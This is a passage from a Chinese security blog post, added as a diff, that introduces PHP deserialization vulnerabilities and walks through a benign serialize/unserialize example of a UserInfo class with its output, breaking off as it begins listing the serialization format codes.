@@ -1,0 +1,2124 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="keywords" content="PHP反序列化, z1r0s 安全 渗透 编程">
+    <meta name="description" content="z1r0s | 程序语言 | 网络安全 | 红蓝对抗">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>PHP反序列化 | z1r0s</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+
+
+   <style>
+    body{
+       background-image: url(/medias/bg.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">z1r0s</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/nav" class="waves-effect waves-light">
+      
+      <i class="fas fa-rocket" style="zoom: 0.6;"></i>
+      
+      <span>导航</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">z1r0s</div>
+        <div class="logo-desc">
+            
+            z1r0s | 程序语言 | 网络安全 | 红蓝对抗
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/nav" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-rocket"></i>
+			
+			Nav
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/131.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">PHP反序列化</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/反序列化/">
+                                <span class="chip bg-color">反序列化</span>
+                            </a>
+                        
+                            <a href="/tags/PHP/">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Security/" class="post-category">
+                                Security
+                            </a>
+                        
+                            <a href="/categories/Security/Web/" class="post-category">
+                                Web
+                            </a>
+                        
+                            <a href="/categories/Security/Web/反序列化/" class="post-category">
+                                反序列化
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-03-16
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-03-17
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    18 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><strong>反序列化漏洞</strong>是基于序列化和反序列化的操作，在反序列化<code>unserialize()</code>时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如<code>eval()</code>函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><p>序列化是将<strong>对象的状态信息（对象的属性值）</strong>转换为可以存储或传输的形式的过程，在序列化期间，对象将当前状态写入（字符串）到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象状态，重新创建该对象。</p>
+<ul>
+<li>序列化：把对象状态信息转换为字节序列的过程称为对象的序列化（<font color="blue">对象状态信息→字节序列</font>）。</li>
+<li>反序列化：把字节序列恢复为对象的过程称为对象的反序列化（<font color="blue">字节序列→对象<code>(类结构)</code></font>）。</li>
+</ul>
+<p>在PHP中通过使用<code>serialize()</code>函数和<code>unserialize()</code>函数将对象进行序列化和反序列化操作。如下所示代码展示在PHP中对象的序列化和发序列化操作。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 序列化: %00*%00属性名</span>
+    <span class="token keyword">protected</span> <span class="token variable">$gender</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 序列化: %00类名%00属性名</span>
+    <span class="token keyword">private</span> <span class="token variable">$isGood</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// 实例化时被调用</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token variable">$gender</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">address</span> <span class="token operator">=</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">gender</span> <span class="token operator">=</span> <span class="token variable">$gender</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// 打印对象时被调用</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'name: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'age: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'address: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">address</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'gender: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">gender</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'isGood: '</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isGood</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">echo</span> <span class="token string">'---------------对象实例化---------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">'四川成都'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'---------------打印对象---------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'------------对象序列化----------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 序列化</span>
+<span class="token variable">$s_serialize</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"serialize_Str ->&lt;br>"</span> <span class="token punctuation">.</span> <span class="token variable">$s_serialize</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 更加清楚的展示私有属性和受保护属性序列化的结果</span>
+<span class="token keyword">echo</span> <span class="token string">'serialize_str by urlencode ->&lt;br>'</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$s_serialize</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'-----------对象反序列化---------------&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 反序列化</span>
+<span class="token variable">$unseri</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s_serialize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$unseri</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">///////////////////////////////////////////////////////////////////</span>
+<span class="token comment" spellcheck="true">// 输出</span>
+<span class="token comment" spellcheck="true">// php5.6.9</span>
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>对象实例化<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>打印对象<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+name<span class="token punctuation">:</span> Alice
+age<span class="token punctuation">:</span> <span class="token number">18</span>
+address<span class="token punctuation">:</span> 四川成都
+gender<span class="token punctuation">:</span> 女
+isGood<span class="token punctuation">:</span> <span class="token number">1</span>
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>对象序列化<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
+serialize_Str <span class="token operator">-</span><span class="token operator">></span>
+O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"UserInfo"</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"Alice"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"address"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"四川成都"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"*gender"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"女"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string">"UserInfoisGood"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+serialize_str by urlencode <span class="token operator">-</span><span class="token operator">></span>
+O<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22UserInfo<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22Alice<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22age<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bi<span class="token operator">%</span><span class="token constant">3A18</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A7</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22address<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A12</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span><span class="token constant">9B</span><span class="token operator">%</span><span class="token constant">9B</span><span class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">%</span><span class="token constant">9D</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token number">90</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token constant">BD</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A9</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span>00gender<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token constant">B3</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A16</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>00UserInfo<span class="token operator">%</span>00isGood<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bb<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span>
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>对象反序列化<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+
+<span class="token function">object</span><span class="token punctuation">(</span>UserInfo<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (5) {</span>
+  <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"Alice"</span>
+  <span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>
+  <span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token string">"四川成都"</span>
+  <span class="token punctuation">[</span><span class="token string">"gender"</span><span class="token punctuation">:</span><span class="token keyword">protected</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"女"</span>
+  <span class="token punctuation">[</span><span class="token string">"isGood"</span><span class="token punctuation">:</span><span class="token string">"UserInfo"</span><span class="token punctuation">:</span><span class="token keyword">private</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">///////////////////////////////////////////////////////////////////</span></code></pre>
+<p><strong>注</strong>：</p>
+<ul>
+<li><p>由上述代码可知对象反序列化之后是一个有序的字符串，其中的字母、数字是对类及其属性的标记。</p>
+<pre class=" language-php"><code class="language-php">String <span class="token punctuation">:</span> s<span class="token punctuation">:</span>size<span class="token punctuation">:</span>value<span class="token punctuation">;</span>
+Integer <span class="token punctuation">:</span> i<span class="token punctuation">:</span>value<span class="token punctuation">;</span>
